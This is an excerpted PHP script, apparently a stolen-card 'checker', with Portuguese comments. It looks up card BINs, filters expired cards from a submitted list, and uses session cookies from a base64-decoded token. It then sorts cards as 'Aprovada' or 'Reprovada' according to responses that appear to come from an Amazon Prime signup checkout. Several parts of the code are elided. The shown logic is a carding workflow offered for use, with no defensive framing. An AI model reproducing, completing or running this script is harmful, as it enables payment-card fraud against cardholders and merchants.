...
$verificar = base64_decode($_POST['token']); // essa area e responsavel one retorara cookies, token da index informada no campo "chave key"
...
function bin($cartao) {
    $bin = substr($cartao, 0, 6); // Pega os primeiros 6 dígitos do cartão
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/$bin");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Habilitar verificação SSL
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); // Verificar host
    ...
    if ($response) {
        ...
        if (!empty($data)) {
            ...
            $nivel = isset($data['brand']) ? strtoupper($data['brand']) : 'DESCONHECIDO'; // Usa 'brand' como proxy para nível
    ...
    return "Bandeira: DESCONHECIDA | Tipo: DESCONHECIDO | Nivel: DESCONHECIDO | Banco: DESCONHECIDO DESCONHECIDO";
}

if ($separar[2] < date("Y") || ($separar[2] == date("Y") && $mes < (int)date("m"))) {
  echo json_encode(array("erro"=> "true", "response"=> time(), "dados"=> ["1" => $lista, "2"=> "CARD EXPIRADO"]));
...
if(is_numeric($cc) && strlen($cc) == 16 || is_numeric($cc) && strlen($cc) == 15){
    ...
    if (strpos($mesgirespfim, 'BILLING_ADDRESS_RESTRICTED') !== false || strpos($mesgirespfim, 'Non è stato possibile completare la tua iscrizione a Prime. Ti consigliamo di riprovare durante il proceso di checkout.')!==false) {
      echo "<font color='white'>Aprovada -> $lista | Retorno: Authorised (00)</font>";
      exit();
    }else if (strpos($mesgirespfim, 'InvalidInput') !== false) {
      echo "<font color='white'>Reprovada -> $lista | Retorno:<font color='red'> PAGAMENTO RECUSADO</font>";
      exit();
  ...
  echo "<font color='white'>Reprovada -> $lista | Retorno: <font color='red'> CARTAO NAO SUPORTADO</font>";
  exit();
}
